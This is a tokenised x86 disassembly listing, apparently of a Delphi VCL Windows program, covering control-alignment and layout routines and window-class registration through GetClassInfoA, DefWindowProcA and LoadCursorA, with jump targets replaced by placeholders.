mov eax [ ebp - 0x4 ]
call sub_441200
xor eax eax
push ebp
push sub_44099c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43d588
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4409a3
mov eax [ ebp - 0x4 ]
call sub_441208
retn
sub_4409a3
mov eax [ ebp - 0x4 ]
call sub_440888
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44205c
pop ebx
pop ecx
pop ebp
retn
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax [ ebp - 0x4 ]
call sub_43f334
sub_4409d8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
xor ebx ebx
mov bl [ ebp - 0x1 ]
cmp ebx 0x6
ja r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
jmp [ ebx * 4 + jump_table_4409f3 ]
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setle cl
jmp r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setle cl
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0xa4 ]
mov ecx eax
sub_440a64
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov al [ eax + rw-data ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x61 ]
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_444c6c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov al [ ebp - 0x5 ]
add al 0xfd
sub al 0x2
jb r-xdata
lea ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
mov edx [ ebx + 0x4c ]
mov eax [ ebx + 0x48 ]
call sub_412618
lea edx [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov al [ ebp - 0x5 ]
dec eax
sub al 0x2
jb r-xdata
sub al 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_440de5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440dec
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
jmp [ eax * 4 + jump_table_440cfa ]
sub al 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x88 ]
push eax
call sub_406118
mov edx [ ebp - 0x14 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
sub [ eax + 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xa8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
xor eax eax
mov al [ ebp - 0x5 ]
cmp eax 0x6
ja r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
je r-xdata
sub eax edx
mov [ ebp - 0xc ] eax
adc edx 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_440c5d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
push eax
call sub_406118
mov edx [ ebp - 0x18 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x18 ] edx
jmp r-xdata
sub eax edx
mov [ ebp - 0x10 ] eax
adc edx 0x0
sub_440dec
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
xor edx edx
mov dl [ ebp - 0x5 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
cmp edx [ ebp - 0x18 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_440e1b ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
sub_440ea4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_441698
dec eax
test eax eax
jl r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp bl [ eax + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_413918
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] bl
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_413a74
lea ecx [ ebp - 0x18 ]
mov edx ebx
call sub_440a64
pop ecx
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_44165c
mov edi eax
cmp bl [ edi + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp edi [ eax - 0x10 ]
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
xor esi esi
jmp r-xdata
mov eax [ r-xdata ]
and eax [ edi + 0x50 ]
mov edx [ r-xdata ]
cmp edx eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp esi [ eax + 0x8 ]
jge r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ecx edi
mov edx esi
call sub_413af0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx esi
call sub_413a74
mov edx eax
mov ecx ebx
mov eax edi
call sub_4409d8
pop ecx
test al al
je r-xdata
test [ edi + 0x51 ] 0x4
jne r-xdata
inc esi
sub_441014
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov bl 0x1
mov eax [ edi ]
call sub_441698
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ edi ]
mov edx esi
call sub_44165c
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ edi ]
mov edx esi
call sub_44165c
mov dl [ r-xdata ]
cmp dl [ eax + 0x61 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_441068
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
push ebp
call sub_441014
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_441147
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_440ea4
pop ecx
push ebp
mov al 0x2
call sub_440ea4
pop ecx
push ebp
mov al 0x3
call sub_440ea4
pop ecx
push ebp
mov al 0x4
call sub_440ea4
pop ecx
push ebp
mov al 0x5
call sub_440ea4
pop ecx
push ebp
mov al 0x6
call sub_440ea4
pop ecx
push ebp
xor eax eax
call sub_440ea4
pop ecx
mov eax [ ebp - 0x4 ]
mov si 0xffc7
call sub_40348c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403290
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov si 0xffee
call sub_40348c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x2c ]
sub_44116c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_444c6c
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x160 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_441200
xor eax eax
push ebp
push sub_4411f3
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x90 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_441208
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x10
jmp r-xdata
sub_441230
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4412f5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_43db50
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_441698
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4412fc
mov eax [ ebp - 0xc ]
call sub_403290
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44165c
mov edx eax
mov eax [ ebp - 0xc ]
call sub_413918
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_43d8bc
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_413a74
xor ecx ecx
mov edx 0xb03e
call sub_43f334
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44165c
mov edi eax
mov eax [ edi + 0x4 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
sub_441304
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_441698
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_441200
xor edx edx
push ebp
push sub_4413eb
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_441698
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc0
call sub_40348c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
jmp r-xdata
inc edi
xor ebx ebx
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
test ebx ebx
jg r-xdata
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44165c
mov edx eax
mov eax [ ebp - 0xc ]
call sub_413918
mov edx ebx
dec edx
mov eax [ ebp - 0xc ]
call sub_413a74
cmp [ eax + 0x5b ] 0x3
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_403290
mov eax [ ebp - 0x4 ]
call sub_441208
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44165c
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x3
call sub_43d660
mov dl 0x4
call sub_43d660
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x8 ]
dec edx
mov eax [ ebp - 0xc ]
call sub_413964
sub_441458
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4553f0
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
call sub_459114
sub_441478
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_43ca40
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_43ca40
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_43ca40
jmp r-xdata
mov [ ebx + 0x30 ] esi
sub_4414c4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_43ca68
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_43ca68
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_43ca68
jmp r-xdata
xor eax eax
mov [ ebx + 0x30 ] eax
pop esi
pop ebx
retn
sub_44150c
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_40348c
push 0x1
mov esi ebx
mov ecx esi
mov edx 0xb02c
mov eax edi
call sub_43f334
mov edx ebx
mov eax edi
call sub_441478
test [ ebx + 0x1c ] 0x2
jne r-xdata
push 0x1
mov ecx esi
mov edx 0xb036
mov eax edi
call sub_43f334
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_43f334
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_43f334
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_43f334
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_43f334
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax edi
call sub_444c6c
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax ebx
call sub_43f334
mov eax edi
call sub_44205c
jmp r-xdata
mov edx ebx
mov eax edi
call sub_44116c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4415e0
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
push 0x0
mov edi ebx
mov ecx edi
mov edx 0xb036
mov eax esi
call sub_43f334
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax esi
call sub_444c6c
test al al
je r-xdata
mov dl 0x1
mov ebp ebx
mov eax ebp
call sub_441458
mov eax ebp
call sub_441ec0
jmp r-xdata
mov edx ebx
mov eax esi
call sub_4414c4
push 0x0
mov ecx edi
mov edx 0xb02c
mov eax esi
call sub_43f334
mov eax esi
call sub_441228
pop ebp
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_43e594
sub_44165c
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov ebp [ ebx + 0x198 ]
test ebp ebp
je r-xdata
xor esi esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
mov edx edi
sub edx esi
mov eax [ ebx + 0x19c ]
call sub_413a74
mov edx edi
mov eax ebp
call sub_413a74
jmp r-xdata
cmp esi edi
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4416b8
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esp ]
call sub_441698
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_44165c
mov ebp eax
mov edx esi
mov eax [ ebp + 0x3c ]
call [ ebp + 0x38 ]
cmp [ esi + 0xc ] 0x0
jne r-xdata
sub_4416f8
add esp 0xfffffff0
movzx edx dx
mov [ esp ] edx
xor edx edx
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
call sub_4416b8
add esp 0x10
retn
sub_441720
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x34 ]
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
mov [ ebx + 0x34 ] edi
mov eax [ ebx + 0x24 ]
and eax 0xffffbf1f
or eax 0x3
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0x24 ]
push eax
push esi
push 0x0
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ ebx + 0x34 ]
push eax
call GetClassInfoA
sub_44178c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_43e790
test al al
je r-xdata
mov eax ebx
call sub_43e7c0
test al al
je r-xdata
or [ edi ] 0x2000
mov eax ebx
mov si 0xffc8
call sub_40348c
test al al
je r-xdata
or [ edi ] 0x4000
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffca
call sub_40348c
test al al
jne r-xdata
mov eax ebx
mov si 0xffca
call sub_40348c
cmp al 0x1
jne r-xdata
or [ edi ] 0x1000
jmp r-xdata
or [ edi ] 0x0
sub_4417f4
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_441912
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
xor ecx ecx
mov edx 0x8c
call sub_402cac
mov eax [ esi + 0x64 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] 0x44000000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_44178c
test [ esi + 0x50 ] 0x1
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
or [ ebx + 0x4 ] 0x2000000
or [ ebx + 0x8 ] 0x10000
cmp [ esi + 0x1a4 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax [ esi + 0x40 ]
mov [ ebx + 0xc ] eax
mov eax [ esi + 0x44 ]
mov [ ebx + 0x10 ] eax
mov eax [ esi + 0x48 ]
mov [ ebx + 0x14 ] eax
mov eax [ esi + 0x4c ]
mov [ ebx + 0x18 ] eax
mov edi [ esi + 0x30 ]
test edi edi
je r-xdata
or [ ebx + 0x4 ] 0x10000
or [ ebx + 0x4 ] 0x8000000
mov eax [ esi + 0x190 ]
mov [ ebx + 0x1c ] eax
mov eax edi
call sub_444968
mov [ ebx + 0x1c ] eax
jmp r-xdata
mov [ ebx + 0x24 ] 0xb
mov eax DefWindowProcA
mov [ ebx + 0x28 ] eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebx + 0x3c ] eax
xor eax eax
mov [ ebx + 0x40 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x34 ] eax
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_4031e0
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404244
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x4c ]
call sub_4085e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441919
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
sub_441920
push ebp
mov ebp esp
add esp 0xffffff40
push ebx
push esi
xor edx edx
mov [ ebp - 0xc0 ] edx
mov esi eax
xor eax eax
push ebp
push sub_441ae1
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x98 ]
cmp [ ebp - 0x70 ] 0x0
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ esi + 0x174 ] eax
lea eax [ ebp - 0xb4 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
